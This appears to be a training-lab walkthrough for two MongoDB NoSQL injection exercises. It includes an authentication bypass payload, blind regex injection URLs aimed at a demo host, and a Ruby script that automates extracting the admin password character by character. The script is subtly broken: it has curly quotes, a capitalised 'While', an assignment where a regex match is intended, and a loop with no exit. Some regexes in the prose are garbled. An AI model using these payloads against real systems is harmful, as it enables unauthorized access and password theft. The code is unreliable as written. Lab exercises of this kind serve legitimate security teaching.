MongoDB￼

This example is the MongoDB version of the (in)famous ' or 1=1 --.

If you remember what you saw previously, you know that you will need two things to bypass this login:

An always true condition.
A way to correctly terminate the NoSQL query.
First, by reading MongoDB documentation you can find that the SQL or 1=1 translates to || 1==1 (note the double =).

Then by poking around, you can see that a NULL BYTE will prevent MongoDB from using the rest of the query.

In some cases, you can also use the comments // or <!-- to comment out the end of the query.

With this information, you should be able to bypass the authentication form.


MongoDB 02



In this example, we will try to retrieve more information from the NoSQL database.

Using a bit of guess work (or previous knowledge of the application), we can deduce that there is probably a password field.

We can play around to confirm that suspicion:

if we access [/?search=admin'%20%26%26%20this.password.match(/.\*/)%00](): we can see a result.
if we access [/?search=admin'%20%26%26%20this.password.match(/zzzzz/)%00](): we cannot see a result.
if we access [/?search=admin'%20%26%26%20this.passwordzz.match(/.\*/)%00](): we get an error message (since the field passwordzz does not exist).
Now, we have a way to perform a blind injection since we have two states:

No result when the regular expression does not match something: false state.
One result when the regular expression matches something: true state.
Using this knowledge, we can script the exploitation to retrieve the admin password.

We will first ensure that the matching is done correctly by using: ^ and $ to make sure we do not match characters in the middle of the string (otherwise iterating will be far harder).

The algorithm looks like:

test if password match /^a._$/ if it matches test without the wildcard ._(to check if it's the full password). Then move to the next letter if it does not match.
test if password match /^b._$/ if it matches test without the wildcard ._. Then move to the next letter if it does not match.
For example, if the password is aab, the following test will be performed:

/^a.\*$/ that will return true.
/^a$/ that will return false.
/^aa.\*$/ that will return true.
/^aa$/ that will return false.
/^aaa.\*$/ that will return false.
/^aab.\*$/ that will return true.
/^aab$/ that will return true. The password has been found.
With these details, you should be able to retrieve the password for the user admin. The password is the key to solve this exercises, so it should have the following format:XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX, where X can be [0-9a-f].

In case the password field does not exist for some records (since it's a NoSQL database), it's always a good idea to ensure its presence by using ... && this.password && this.password.match(... instead of just using ... && this.password.match(....


?username=admin’ || 1==1 %00



MongoDB Injection 02


#http://demo.libcurl.so/?search=admin%27%20%26%26%20this.password.match(/d/)%00

#http://demo.libcurl.so/?search=admin%27%20%26%26%20this.password.match(/aaa/)%00


require ‘httparty’

URL=“demo.libcurl.so”
def check?(str)
    resp = HTTParty.get(“http://#{URL}/?search=admin%27%20%26%26%20this.password.match(/#{str}/)%00”)
    return resp.body = />admin</
end

#puts check?(“d”).inspect
#puts check?(“aaa”).inspect

CHARSET = (‘a’..’z’).to_a+(‘0’..’9’).to_a+[‘-‘]
password = “”

While true
     CHARSET.each do |c|
         puts “Trying: #{c} for #{password}”
         test = password + c 
         if check?(“#{test}.*$”)
             password+=c
             puts password  
             break
         end
     end
end





